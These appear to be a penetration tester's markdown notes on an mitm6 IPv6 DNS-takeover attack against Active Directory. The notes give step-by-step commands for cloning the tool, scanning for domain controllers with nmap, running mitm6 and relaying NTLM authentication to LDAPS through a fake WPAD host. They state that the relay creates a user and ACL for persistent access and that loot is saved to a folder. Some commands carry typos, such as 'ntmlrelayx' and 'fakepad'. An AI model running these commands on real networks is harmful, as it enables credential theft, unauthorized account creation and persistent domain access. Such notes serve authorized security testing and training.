mitim6 (search for dirk jan m)

# mitm6:
```
mitm6 -d (domain to attack like marvel.local)
then use:
ntlmrelayx.py -6 -t ldaps://192.168.57.140 -wh fakepad.marvel.local -l lootme
```



## IPv6: mitm6
1. install from github
```
cd /opt; git clone https://github.com/fox-it/mitm6.git; cd mitm6
```
2. get Domain Controller IP 
Domain controllers will show port 389 running the Microsoft Windows AD LDAP service:
```
nmap -p389 -sV <IP-range>
```
Expected Output:
```
PORT    STATE SERVICE VERSION 
389/tcp open  ldap    Microsoft Windows AD LDAP (Domain:TESTDOMAIN, Site: TEST) 
```
OR:
```
nmap -p 389 -T4 -A -v --script ldap-rootdse <IP-range>
```
3. get Domain name using nmap
```
nmap --script smb-enum-domains.nse -p445 <host>
sudo nmap -sU -sS --script smb-enum-domains.nse -p U:137,T:139 <host>
```
OR:
```
nmap --script smb-os-discovery.nse -p445 127.0.0.1
sudo nmap -sU -sS --script smb-os-discovery.nse -p U:137,T:139 127.0.0.1
```

4. run mitm6
```
sudo python mitm6.py -d <domain>.local
```

5. run ntmlrelayx.py at the same time
```
ntmlrelayx.py -6 -t ldaps://<DC-IP> -wh fakewpad.<domain>.local -l lootme
```
6. check on results:
all captured info will be saved to lootme folder in the directory you ran this command. when someone logs in to a computer on the network this will try to create a user and acl for persistent access. 
```
firefox ./lootme/domain_users.html
```
Always check for passwords in the description. 

